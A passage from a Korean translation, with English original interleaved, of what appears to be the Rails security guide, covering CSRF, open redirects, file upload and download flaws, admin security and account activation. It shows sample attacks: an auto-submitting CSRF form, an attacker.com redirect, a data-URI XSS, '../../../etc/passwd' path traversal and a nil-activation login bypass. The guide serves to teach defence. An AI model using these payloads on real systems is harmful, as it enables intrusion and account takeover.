* www.webapp.com 으로 연결되는 웹어플리케이션은 해당 세션 해시에 포함되어 있는 사용자 정보를 확인하게 되고 결국 1번 프로젝트를 삭제하게 됩니다. 그리고 나서 해당 브라우저에 대해서 기대치 못한 결과인 결과 페이지가 반환되고 결국 이미지를 표시되지 않게 될 것입니다. [[[The web application at www.webapp.com verifies the user information in the corresponding session hash and destroys the project with the ID 1. It then returns a result page which is an unexpected result for the browser, so it will not display the image.]]]

* Bob 은 공격상황을 인지하지 못하지만 몇일 후에 해당 번호의 프로젝트가 삭제된 것을 발견하게 됩니다. [[[Bob doesn't notice the attack - but a few days later he finds out that project number one is gone.]]]

실제로는 이러한 조작된 이미지나 링크가 반드시 웹어플리케이션의 도메인에 위치할 필요는 없다는 것을 아는 것이 중요합니다. 즉, 포럼, 블로그 또는 이메일에도 위치할 수도 있습니다. [[[It is important to notice that the actual crafted image or link doesn't necessarily have to be situated in the web application's domain, it can be anywhere - in a forum, blog post or email.]]]

CSRF는 CVE (Common Vulnerabilities and Exposures) 에서 거의 보이지 않습니다. 2006년 경우 0.1% 미만에 불과했지만, 실제로는 '잠자는 거인'[Grossmann]의 형상을 하고 있는 것입니다. 이것은 나(그리고 다른 사람들)의 담보계약 업무에서의 결과와 현저한 대조를 이루는 것인데, _CSRF는 중요한 보안 문제입니다._ [[[CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) - less than 0.1% in 2006 - but it really is a 'sleeping giant' [Grossman]. This is in stark contrast to the results in my (and others) security contract work - _CSRF is an important security issue_.]]]

### [CSRF Countermeasures] CSRF 대처법

NOTE: _가장 중요한 것은, W3C의 요구사항이기도 한데, 적절하게 GET과 POST를 사용하는 것입니다. 두번째로는, non-GET 요청에서 보안 토큰을 사용하면, 어플리케이션을 CSRF로부터 보호할 수 있을 것입니다._ [[[_First, as is required by the W3C, use GET and POST appropriately. Secondly, a security token in non-GET requests will protect your application from CSRF._]]]

HTTP 프로토콜은 기본적으로 GET과 POST 두개의 요청 형태(이것 외에도 더 있지만 대부분의 브라우저에서는 지원하지 않습니다)를 제공해 줍니다. World Wide Web Consortium (W3C) 에서는 HTTP GET 또는 POST 선택시 점검사항을 제공해 줍니다. [[[The HTTP protocol basically provides two main types of requests - GET and POST (and more, but they are not supported by most browsers). The World Wide Web Consortium (W3C) provides a checklist for choosing HTTP GET or POST:]]]

**GET을 사용할 경우** [[[Use GET if:]]]

* 상호작용이 _질의와 흡사_한 경우 (예를 들면, 쿼리, 읽기, 또는 검색)
[[[The interaction is more _like a question_ (i.e., it is a safe operation such as a query, read operation, or lookup).]]]

**POST를 사용할 경우** [[[Use POST if:]]]

* 상호작용이 _주문과 흡사_한 경우, 또는 [[[The interaction is more _like an order_, or]]]

* 상호작용이 사용자가 인지할 수 있는 방식(예, 특정 서비스에 대한 구독)으로 리소스의 _상태를 변경_하는 경우, 또는 [[[The interaction _changes the state_ of the resource in a way that the user would perceive (e.g., a subscription to a service), or]]]

* 사용자가 상호작용의 _결과에 대해서 책임_을 지게 되는 경우 [[[The user is _held accountable for the results_ of the interaction.]]]

웹어플리케이션이 RESTful할 경우, PATCH, PUT, DELETE 와 같은 추가 HTTP 메소드에 익숙해져 있을 것입니다. 그러나, 오늘날 웹브라우저 대부분은 GET과 POST 외에는 지원하지 않습니다. 레일스는 이러한 문제점을 해결하기 위해서 hidden `_method` 속성을 사용합니다. [[[If your web application is RESTful, you might be used to additional HTTP verbs, such as PATCH, PUT or DELETE. Most of today's web browsers, however do not support them - only GET and POST. Rails uses a hidden `_method` field to handle this barrier.]]]

_POST 요청을 또한 자동으로 보낼 수 있습니다_. 아래에, 브라우저 상태바에 목적지로서 www.harmless.com 도메인을 표시해 주는 링크에 대한 예재 코드가 있습니다. 실제로, 이것은 동적으로 POST 요청을 보내게 되는 새로운 폼을 생성하게 됩니다. [[[_POST requests can be sent automatically, too_. Here is an example for a link which displays www.harmless.com as destination in the browser's status bar. In fact it dynamically creates a new form that sends a POST request.]]]

```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
```

또는 공격자는 특정 이미지의 onmouseover 이벤트 핸들러에 이 코드를 삽입해 두게 됩니다. [[[Or the attacker places the code into the onmouseover event handler of an image:]]]

```html
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
```

백그라운드에서 공격하는 Ajax 를 포함해서 여러가지 다른 경우들도 있습니다. _이러한 것에 대한 해결책은 non-GET 요청시에 보안 토큰을 포함하는 것입니다_. 이러한 요청은 서버측에서 보안 토큰을 점검하게 됩니다. 레일스 2부터는 어플리케이션 컨트롤러에서 한줄로 해결하게 됩니다. [[[There are many other possibilities, including Ajax to attack the victim in the background. The _solution to this is including a security token in non-GET requests_ which check on the server-side. In Rails 2 or higher, this is a one-liner in the application controller:]]]

```ruby
protect_from_forgery secret: "123456789012345678901234567890..."
```

이렇게 하면, 레일스에서 생성되는 모든 폼과 Ajax 요청에서, 현재 세션과 서버측 secret 로부터 산출되는 보안 토큰을 자동으로 포함게 될 것입니다. 세션 저장소로 CookieStorage 를 사용할 경우에는 서버측 secret 가 필요없습니다. 보안 토큰이 일치하지 않을 경우에는, 세션이 재설정될 것입니다. **주의:** 레일스 3.0.4 버전 이전에서는 이러한 상황에서 `ActionController::InvalidAuthenticityToken` 에러가 발생하게 됩니다. [[[This will automatically include a security token, calculated from the current session and the server-side secret, in all forms and Ajax requests generated by Rails. You won't need the secret, if you use CookieStorage as session storage. If the security token doesn't match what was expected, the session will be reset. **Note:** In Rails versions prior to 3.0.4, this raised an `ActionController::InvalidAuthenticityToken` error.]]]

예를 들어, `cookies.permament`와 같이 쿠키를 유지하는 상태로 사용자 정보를 저장하는 것이 일반적입니다. 이와 같은 경우에는, 쿠키가 제거되지 않게 되어 즉각적으로 CSRF 보호 효과가 사라지게 될 것입니다. 이러한 정보를 저장하기 위해 세션외에 다른 쿠키 저장을 사용할 경우에는 직접 조치사항을 작성해 주어야 합니다. [[[It is common to use persistent cookies to store user information, with `cookies.permanent` for example. In this case, the cookies will not be cleared and the out of the box CSRF protection will not be effective. If you are using a different cookie store than the session for this information, you must handle what to do with it yourself:]]]

```ruby
def handle_unverified_request
  super
  sign_out_user # Example method that will destroy the user cookies.
end
```

위의 메소드를 `ApplicationController`에 추가해 주면 non-GET 요청시에 CSRF 토큰이 없는 경우 자동으로 호출될 것입니다. [[[The above method can be placed in the `ApplicationController` and will be called when a CSRF token is not present on a non-GET request.]]]

_cross-site scripting (XSS) 에 취약할 경우에는 모든 CSRF 보호 효과가 사라지게 된다_는 것을 주의해야 합니다. XSS 는 공격자가 특정 페이지 상에 있는 모든 엘리먼트에 접근할 수 있게 주기 때문에, 공격자는 특정 폼으로부터 CSRF 보안 토큰을 읽을 수 있게 되거나 해당 폼에 대해서 직접 데이터를 서밋할 수 있게 됩니다. 나중에 <a href="#cross-site-scripting-xss">XSS</a> 에 대한 자세한 내용을 읽어 보기 바랍니다. [[[Note that _cross-site scripting (XSS) vulnerabilities bypass all CSRF protections_. XSS gives the attacker access to all elements on a page, so he can read the CSRF security token from a form or directly submit the form. Read <a href="#cross-site-scripting-xss">more about XSS</a> later.]]]

[Redirection and Files] 리디렉션과 파일
---------------------

보안 취약성의 또 다른 예는 웹어플리케이션에서 리디렉션과 파일을 사용하는 것과 관련이 있습니다. [[[Another class of security vulnerabilities surrounds the use of redirection and files in web applications.]]]

### [Redirection] 리디렉션

WARNING: _웹어플리케이션에서 리디렉션은 저평가되는 해킹 툴입니다. 즉, 공격자는 사용자를 공격용 웹사이트로 이동하게 할 수 있을 뿐만 아니라, 자체적으로 공격을 수행할 수도 있습니다. [[[_Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap web site, he may also create a self-contained attack._]]]

사용자가 리디렉션을 위해 URL을 통과하도록 할 때마다, 공격을 받기 쉽게 됩니다. 가장 확실한 공격은 원래의 웹사이트와 똑같이 보이는 가짜 웹어플리케이션으로 사용자들을 리디렉트하는 것입니다. 소위 피싱 공격은, 이메일로 의심할 여지가 없는 링크를 보내거나, XSS를 이용하여 웹어플리케이션에 특정 링크를 주입하거나, 외부 사이트에 특정 링크를 삽입해 둠으로써 동작하게 됩니다. 의심의 여지가 없는 것은, 해당 링크가 특정 웹사이트로 연결되는 URL로 시작하고 악성 사이트로의 URL은 리디렉션 파라미터로 숨겨지기 때문입니다. 즉, http://www.example.com/site/redirect?to= www.attacker.com 와 같은 형태를 가집니다. 아래에는 legacy 액션의 예를 보여 줍니다. [[[Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to= www.attacker.com. Here is an example of a legacy action:]]]

```ruby
def legacy
  redirect_to(params.update(action:'main'))
end
```

이것은 사용자로 하여금 legacy 액션에 접근시도한 경우 main 액션으로 리디렉트 해 줍니다. 위의 코드의 의도는 legacy 액션으로 넘어가는 URL 파라미터를 유지한 채 main 액션으로 이동하도록 하는 것이었습니다. 그러나 URL에 host 키를 포함한다면 공격자가 이를 탐색할 수 있게 되는 것입니다. [[[This will redirect the user to the main action if he tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can be exploited by an attacker if he includes a host key in the URL:]]]

```
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
```

이 키가 URL 끝에 위치할 경우에는, 잘 인지하지 못한 채로 attacker.com 호스로 사용자가 리디렉트될 것입니다. 간단한 조치방법은 _legacy 액션에서 필요로 하는 파라미터만을 포함하는 것_ 일 겁니다. (즉, 기대하지 않는 파라미터를 제거하는 것과는 달리 whitelist 접근법을 이용하는 것입니다.) _그리고 특정 URL로 리디렉트하게 될 때, whitelist를 점검하거나 정규식을 이용하도록 합니다_. [[[If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to _include only the expected parameters in a legacy action_ (again a whitelist approach, as opposed to removing unexpected parameters). _And if you redirect to an URL, check it with a whitelist or a regular expression_.]]]

#### [Self-contained XSS] 자체 포함된 XSS

또 다른 리디레트와 자체 포함된 XSS 공격은 data 프로토콜 사용하므로써 Firefox 와 Opera 브라우저에서 이루어 지게 됩니다. data 프로토콜은 브라우저 상에 직접 자체 내용을 표시하게 되는데 HTML 또는 자바스크립트로부터 전체 이미지에 이르기까지 어떤 것이어도 상관없습니다. [[[Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:]]]

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`

이 예는 간단한 메시지 박스를 보여주는 Base64로 인코딩된 자바스크립트입니다. 리디렉션 URL 상에서 공격자는 악성 코드가 들어 있는 이 URL로 리디렉트하게 할 수 있습니다. 이에 대한 조치로는, _사용자가 리디렉트할 URL을 지정할 수 없도록 하는 것입니다_. [[[This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, _do not allow the user to supply (parts of) the URL to be redirected to_.]]]

### [File Uploads] 파일 업로드

NOTE: _파일 업로드를 할 때 중요한 파일들이 덮어쓰기 되지 않는다는 것을 확인해야 하고 미디어 파일들을 비동기적으로 처리해야 합니다._
[[[_Make sure file uploads don't overwrite important files, and process media files asynchronously._]]]

다수의 웹어플리케이션에서는 사용자가 파일을 업로드할 수 있도록 합니다. 공격자가 악성 파일명을 이용하여 서버에 있는 어떤 파일이라도 덮어쓰기 할 수 있기 때문에 _사용자가 (부부적으로) 선택할 수 있는 파일명은 반드시 필터링해야_ 합니다. /var/www/uploads 위치에 파일 업로드를 저장할 경우에, 사용자가 "../../../etc/passwd" 와 같이 파일명을 지정한다면, 중요한 파일이 덮어쓰기 될 수 있습니다. 물론 루비 인터프리터가 이러한 작업을 위해서는 적절한 권한을 요구하 것이지만, 이것은 웹서버, 데이터베이스 서버, 그리고 기타 다른 프로그램을 권한이 약한 유닉스 유저의 권한으로 실행하는 이유이기도 합니다. [[[Many web applications allow users to upload files. _File names, which the user may choose (partly), should always be filtered_ as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like "../../../etc/passwd", it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so - one more reason to run web servers, database servers and other programs as a less privileged Unix user.]]]

사용자가 지정한 파일명을 필터링할 때, _문제의 소지가 있는 부분을 제거해서는 안 됩니다_. 웹어플리케이션이 파일명에서 "../" 부분을 모두 제거할 때, 공격자가 "....//"와 같은 문자열을 사용한다며, 결과적으로 "../"을 반환하게 되는 상황을 생각해 보기 바랍니다. 이런 경우에는 whitelist 접근법을 사용하는 것이 최상인데, 수락할 수 있는 문자셋을 미리 준비하여 파일명의 유효성을 점검하는 방법입니다. 이와 반대되는 개념의 blacklist 접근법은 금지 문자를 제거하는 방식입니다. 유효한 파일명이 아니라면 거부하거나 허용되지 않는 문자를 대체하지만 삭제하지는 않습니다. 아래에는 [attachment\_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master)에서 사용하는 파일명 검증 메소드를 소개합니다. [[[When filtering user input file names, _don't try to remove malicious parts_. Think of a situation where the web application removes all "../" in a file name and an attacker uses a string such as "....//" - the result will be "../". It is best to use a whitelist approach, which _checks for the validity of a file name with a set of accepted characters_. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the [attachment\_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master):]]]

```ruby
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.sub! /\A.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
```

(attachment\_fu 플러그인에서 이미지를 처리하듯이) 파일업로드를 동기적츠로 처리하게 되면 denial-of-service 공격에 취약하게 됩니다. 공격자는 여러대의 컴퓨터에서 이미지 파일을 업로드하게 되면 서버의 부하를 증가시켜 결국 서버를 멈추게 할 수 있습니다. [[[A significant disadvantage of synchronous processing of file uploads (as the attachment\_fu plugin may do with images), is its _vulnerability to denial-of-service attacks_. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.]]]

이에 대한 해결방법은 _미디어 파일을 비동기적으로 처리하는 것_ 입니다. 즉, 미디어 파일을 데이터베이스에 저장한 후, 처리 요청 시간을 스케쥴 관리하는 것입니다. 다음 단계로는 백그라운드에서 파일을 처리하게 되는 것입니다. [[[The solution to this is best to _process media files asynchronously_: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.]]]

### [Executable Code in File Uploads] 업로드 파일내의 실행코드

WARNING: _업로드 된 파일 내의 소스코드는 특정 디렉토리에 위치할 때 실행될 수 있습니다. 따라서 Apache 홈 디렉토리가 레일스의 /public 디렉토리에 연결될 경우에는 업로드된 파일을 이 디렉토리에 두어서는 안됩니다_. [[[_Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails' /public directory if it is Apache's home directory._]]]

일반적으로 흔히 사용하는 Apache 웹서버는 DocumentRoot 라는 옵션을 지정할 수 있습니다. 이것은 웹사이트의 홈 디렉토리로써 이 디렉토리 내에 존재하는 모든 것은 웹서버가 서비스하게 됩니다. 어떤 파일 확장자는, 몇가지 옵션만 설정해 두면 요청시 파일내의 코드가 실행되기도 합니다. 이러한 예가 바로 PHP와 CGI 파일들입니다. 공격자가 코드가 들어있는 "file.cgi"라는 파일을 업로드하는 상황을 생각해 보겠습니다. 이후에 이 파일을 누군가가 다운로드하면 파일내의 코드가 실행이 될 것입니다. [[[The popular Apache web server has an option called DocumentRoot. This is the home directory of the web site, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file "file.cgi" with code in it, which will be executed when someone downloads the file.]]]

따라서, _Apache DocumentRoot가 레일스의 /public 디렉토리로 지정된 경우에는, 이 디렉토리에 직접 파일을 업로드해서는 안되고_, 최소한 단 레벨 아래의 디렉토리에 저장해야 합니다. [[[_If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it_, store files at least one level downwards.]]]

### [File Downloads] 파일 다운로드

NOTE: _사용자가 아무 파일이나 다운로드할 수 있게 해서는 안됩니다._ [[[_Make sure users cannot download arbitrary files._]]]

파일 업로드시에 파일명에 제한을 두어야 하듯이, 다운로드시에도 마찬가지입니다. send_file() 메소드는 서버로부터 클라이언트로 파일을 전송해 줍니다. 사용자가 입력하는 파일명을 제한없이 그대로 사용한다면, 모든 파일을 다운로드할 수 있게 됩니다. [[[Just as you have to filter file names for uploads, you have to do so for downloads. The send_file() method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:]]]

```ruby
send_file('/var/www/uploads/' + params[:filename])
```

"../../../etc/passwd"와 같이 파일명을 지정하면 서버의 사용자 로그인 정보를 다운로드할 수 있게 됩니다. 이러한 문제에 대한 간단한 해결방법은 _요청된 파일이 지정 디렉토리에 있는지를 점검하는 것입니다_. [[[Simply pass a file name like "../../../etc/passwd" to download the server's login information. A simple solution against this, is to _check that the requested file is in the expected directory_:]]]

```ruby
basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename !=
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, disposition: 'inline'
```

다른 방법으로는 데이터베이스에 파일명을 저장하고 데이터베이스의 id를 이용하여 파일명을 만드는 것입니다. 이것 역시 업로드된 파일내에 있을 수 있는 코드가 실행되지 못하게 하는 좋은 방법입니다. attachment_fu 플러그인이 바로 이런 방식으로 작업을 합니다. [[[Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file to be executed. The attachment_fu plugin does this in a similar way.]]]

[Intranet and Admin Security] 내부망과 관리자 보안
---------------------------

내부망과 관리자 인터페이스 일반적인 공격 대상이 되는데, 특별한 권한을 가진 사용자에게만 접근할 수 있도록 하기 때문입니다. 따라서 이를 방지하기 위한 몇가지 특별한 보안 대책이 필요하지만, 실제로는 그렇지 못한 것이 현실입니다. [[[Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world.]]]

2007년에는, 온라인 직원채용 웹어플리케이션인 Monster.com 의 "Monster for employers" 웹사이트(내부망)로부터 정보를 빼낸 최초의 맞춤형 trojan 바이러스가 발견되었습니다. 지금까지 맞춤형 Trojans 바이러스는 매우 드물어서 감염 위험도가 매우 낮지만 충분한 가능성이 있고 또한 클라이언트 호스트의 보안 문제가 얼마나 중요한가를 나타내는 한 예이기도 합니다. 그러나, 인트라넷과 관리자 어플리케이션에 대한 가장 큰 위협은 XSS와 CSRF 입니다. [[[In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the "Monster for employers" web site of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF. ]]]

**XSS** 악성 사용자가 외부망으로부터 입력한 내용을 어플리케이션이 클라이언트 브라우저에 다시 보여 주게 될 때 해당 어플리케이션은 XSS 공격에 취약하게 될 것입니다. 사용자명, 코멘트, 스팸성 리포트, 주문처 주소들은 흔하지 않는 예긴하지만 XSS의 대상이 될 수 있습니다. [[[**XSS** If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.]]]

관리자 인터페이스나 내부망의 한곳이라도 사용자 입력을 감시하지 않는 곳이 있다면 전체 어플리케이션이 공격에 취약해 집니다. 권한을 부여 받은 관리자의 쿠키를 가로챈다던지, iframe을 주입해서 관리자의 비밀번호를 가로챈다던지, 브라우저의 보안 허점을 이용해서 악성 소프트웨어를 설치해서 관리자의 컴퓨터를 점령해 버린다던지 등의 공격이 있을 수 있습니다. [[[Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator's cookie, injecting an iframe to steal the administrator's password or installing malicious software through browser security holes to take over the administrator's computer.]]]

XSS에 대한 조치사항은 Injection 센션을 참고하기 바랍니다. 내부망이나 관리자 인터페이스에서도 _SafeErb 플러그인을 사용할 것을 권합니다_. [[[Refer to the Injection section for countermeasures against XSS. It is _recommended to use the SafeErb plugin_ also in an Intranet or administration interface.]]]

**CSRF** Cross-Site Request Forgery(CSRF)는 대규모의 공격 방법이며 공자가가 관리자나 내부망 사용자만 행할 수 있는 모든 것을 할 수 있도록 해 줍니다. CSRF가 공격하는 방법에 대해서 이미 설명한 바와 같이, 아래에 공격자가 내부망이나 관리자 인터페이스에서 할 수 잇는 몇가지 예를 들어 보겠습니다. [[[**CSRF** Cross-Site Reference Forgery (CSRF) is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.]]]

[CSRF 공격에 의한 라우터 재설정](http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352)과 같은 실례를 들 수 있습니다. 당시에 공격자는 CSRF가 포함된 악성 이메일을 멕시코 사용자들에게 발송했습니다. 이메일에는 전자 카드가 들어 있는 것으로 되어 있었지만 결과적으로 HTTP-GET 요청을 통해서 사용자의 라우터를 재설정하는 이미지 태그도 포함되었습니다. 이러한 방식 멕시코에서는 흔한 공격방법입니다. 이러한 요청은 DNS 설정을 변경해서 멕시코 계열의 은행 사이트로 들어오는 요청을 공격자의 사이트로 매핑시키도록 했습니다. 따라서 해당 라우터를 통해서 해당 은행 사이트로 들어오는 모든 사람들은 공격자의 가짜 웹사이트를 보게 되고 결과적으로 자신의 인증정보가 해킹당하게 되었습니다. [[[A real-world example is a [router reconfiguration by CSRF](http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352). The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake web site and had his credentials stolen.]]]

또 다른 예는 구글 Adsense의 이메일 주소와 비밀번호가 변경된 경우입니다. 구글 광고 상품에 대한 관리자 인터페이스인 구글 Adsense에 특정 사용자가 로그인한 경우 공격자는 해당 사용자의 인증정보를 변경할 수 있을 것입니다. [[[Another example changed Google Adsense's e-mail address and password by. If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change his credentials. ]]]

또 다른 흔한 공격 형태는 웹어플리케이션, 블로그 또는 포럼이 악성 XSS를 전파하도록 만드는 것입니다. 물론 공격자는 해당 웹사이트의 URL 구조를 알고 있어야 하지만, 오픈 소스 어플리케이션의 관리자 인터페이스인 경우에는 대부분의 레일스 URL이 매우 평이해서 쉽게 찾아 낼 수 있을 것입니다. 공격자는 모든 가능성 있는 조합을 시도하기 위해서 단지 악성 IMG 태그를 포함시키는 것 만으로도 1000번 정도의 행운의 추측을 할 수 있습니다. [[[Another popular attack is to spam your web application, your blog or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.]]]

관리자 인터페이스와 내부망 어플리케이션에서 CSRF에 대한 조치사항에 대해서는 CSRF 섹션의 조치사항을 참고하시 바랍니다. [[[For _countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section_.]]]

### [Additional Precautions] 추가 주의사항

일반적인 관리자 인터페이스는 다음과 같이 동작합니다. 대개는 www.example.com/admin 에 위치하고 User 모델에 admin 표시가 된 경우에만 접근할 수 있고, 사용자의 입력 데이터를 다시 볼 수 있으며 어떤 데이터이든 삭제 추가 수정할 수 있도록 되어 있습니다. 아래에 이러한 구조에 대한 몇가지 생각을 정리해 두었습니다. [[[The common admin interface works like this: it's located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:]]]

* _최악의 경우를 생각하는 것_ 이 매우 중요합니다. 즉, 누군가가 본인의 쿠키나 사용자 신용정보를 실제로 가로챘다면 어떻게 될까. 공격 가능성을 줄이기 위해서 관리자 인터페이스에 대해서 _role 기능_ 을 도입할 수 있습니다. 또는 어플리케이션에서 공개된 정보 외의 _특수한 로그인 신용정보를 추가_ 하는 것도 생각해 볼 수 있습니다. _매우 중요한 작업에 대해서는 특별한 비밀번호를 추가_ 하는 것도 고려해 볼 수 있을 것입니다. [[[It is very important to _think about the worst case_: What if someone really got hold of my cookie or user credentials. You could _introduce roles_ for the admin interface to limit the possibilities of the attacker. Or how about _special login credentials_ for the admin interface, other than the ones used for the public part of the application. Or a _special password for very serious actions_?]]]

* 관리자는 정말 이 세상의 모든 곳에서 관리자 인터페이스에 접근해야만 할까요? 따라서 _로그인을 일련의 IP 주소로 제한_ 하는 것을 생각해 볼 수 있습니다. request.remote_ip 에서 사용자의 IP 주소를 알아낼 수 있습니다. 이것은 방탄효과는 없지만 그래도 큰 장벽을 만들어 줄 수 있습니다. 그러나 proxy 가 필요할 수도 있다는 것을 기억하기 바랍니다. [[[Does the admin really have to access the interface from everywhere in the world? Think about _limiting the login to a bunch of source IP addresses_. Examine request.remote_ip to find out about the user's IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.]]]

* 관리자 인터페이스를 admin.application.com과 같이 전용 서브도메인으로 연결하고 별도의 어플리케이션을 만들어 사용자 관리를 따로 하는 방법도 있습니다. 이렇게 하므로써 www.application.com 과 같은 일반적인 도메인으로 부터 관리자 쿠키를 가로채는 것이 불가능하게 됩니다. 이것은 브라우저의 _**same origin policy**_ 때문인데, www.application.com 에 주입된 XSS는 admin.application.com의 쿠키를 읽을 수 없고 그 반대도 마찬가지입니다. [[[_Put the admin interface to a special sub-domain_ such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.]]]

[User Management] 사용자 관리
---------------

NOTE: _거의 모든 웹어프리케이션은 사용자 인증과 권한설정 기능을 제공해야 합니다. 직접 만드는 것보다는 흔히 사용하는 플러그인을 사용할 것을 권합니다. 그러나 또한 항상 최신의 상태로 업데이트 지속적으로 해야 합니다. 몇가지 주의사항만 잘 지키면 어플리케이션을 보다 보안상 더 안전하게 만들 수 있습니다._ [[[_Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure._]]]

다수의 레일스용 인증 플러그인을 사용할 수 있습니다. [devise](https://github.com/plataformatec/devise)와 [authlogic](https://github.com/binarylogic/authlogic) 와 같은 훌륭한 플러그인들은 평문형 비밀번호를 대신에 암호화된 비밀번호만을 저장합니다. 레일스 3.1 부터는 유사한 기능을 가지는 `has_secure_password` 메소드를 기본 제공하고 있습니다. [[[There are a number of authentication plug-ins for Rails available. Good ones, such as the popular [devise](https://github.com/plataformatec/devise) and [authlogic](https://github.com/binarylogic/authlogic), store only encrypted passwords, not plain-text passwords. In Rails 3.1 you can use the built-in `has_secure_password` method which has similar features.]]]

새로 등록한 모든 사용자는 인증을 위한 이메일을 받게 되는데 사용자 자신의 계정을 활성화하기 위한 링크를 포함하고 있습니다. 계정이 활성화된 후에는 데이터베이스의 activation_code 컬럼이 NULL 값으로 할당될 것입니다. 누군가 이와 같은 URL을 요청했다면 데이터베이스에서 조회되는 최초의 활성화된 사용자로써 로그인될 것입니다. 이것은 아마도 관리자일 가능이 있습니다. [[[Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):]]]

```
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
```

이것이 가능한 이유는, 어떤 서버에서는 이런식으로, params[:id]와 같이, id 파라미터가 nil이 될 것이기 때문입니다. 그러나, 아래에는 계정 활성화를 위한 액션에서 사용하는 finder 메소드를 볼 수 있습니다. [[[This is possible because on some servers, this way the parameter id, as in params[:id], would be nil. However, here is the finder from the activation action:]]]

```ruby
User.find_by_activation_code(params[:id])
```

파라미터가 nil이라면 다음과 같은 SQL 쿼리문을 보게 될 것입니다. [[[If the parameter was nil, the resulting SQL query will be]]]

```sql
SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
```

